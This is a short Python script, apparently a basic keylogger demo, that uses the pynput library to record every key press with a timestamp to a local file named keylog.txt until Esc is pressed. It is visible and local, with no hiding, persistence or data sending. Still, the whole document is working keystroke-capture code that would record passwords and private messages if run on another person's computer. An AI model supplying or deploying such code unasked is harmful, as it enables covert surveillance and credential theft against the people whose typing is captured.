from pynput import keyboard
from datetime import datetime

# File to save captured keystrokes
LOG_FILE = "keylog.txt"

# Function to log the pressed key
def on_press(key):
    try:
        # Append keystrokes to file
        with open(LOG_FILE, "a") as log:
            # Write the key to the file with timestamp
            log.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        # Special keys (like shift, ctrl, etc.)
        with open(LOG_FILE, "a") as log:
            log.write(f"{datetime.now()} - {key}\n")

# Stop logging on pressing Esc
def on_release(key):
    if key == keyboard.Key.esc:
        print("[INFO] Stopping keylogger...")
        return False  # Stops listener

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("[INFO] Keylogger running... Press 'Esc' to stop.")
    listener.join()